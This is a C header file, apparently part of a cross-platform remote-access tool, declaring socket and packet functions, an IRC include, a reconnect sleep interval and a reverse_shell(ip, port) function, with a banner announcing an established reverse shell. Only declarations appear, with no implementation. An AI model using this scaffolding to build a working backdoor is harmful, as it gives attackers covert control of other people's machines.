#ifndef _NET_H
#define _NET_H

// socket handling
#ifdef _WIN32
#pragma once
#include "pch.h"
#include <winsock2.h>
#include <Windows.h>
#include <ws2tcpip.h>
#pragma comment(lib,"WS2_32")

#elif defined(__linux__) || defined(__APPLE__)
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <string.h>
// File descriptior controller
#include <fcntl.h>
#define closesocket(s) close(s)
#define SOCKET_ERROR -1
#define INVALID_SOCKET -1
#endif

#include <sys/types.h>
#include <stdio.h>
#include "irc.h"

// sleep handling
#if defined(__linux__) || defined(__APPLE__)
#include <unistd.h>
#include <stdlib.h>
#endif

#define SHELL_MOTD " ┬┴┬┴┤/ᐠ｡‸｡ᐟ\\├┬┴┬┴ Reverse shell stablished, do as you wish\n"
// This time is in seconds
#define SLEEP_TIME 20

void create_socketfd(int* fd);
void connect_socket(int* fd);
void start_reading_loop(int *fd);
void net_sleep(int seconds);

#ifdef _WIN32
void send_packet(int fd, CHAR *packet, size_t packet_size);
#elif defined(__linux__) || defined(__APPLE__)
void send_packet(int fd, char *packet, size_t packet_size);
#endif

#ifdef _WIN32
int read_packet(int *fd, CHAR *buffer);
#elif defined(__linux__) || defined(__APPLE__)
int read_packet(int *fd, char *buffer);
#endif

#ifdef _WIN32
void reverse_shell(CHAR *ip, int port);
#elif defined(__linux__) || defined(__APPLE__)
void reverse_shell(char *ip, int port);
#endif

#endif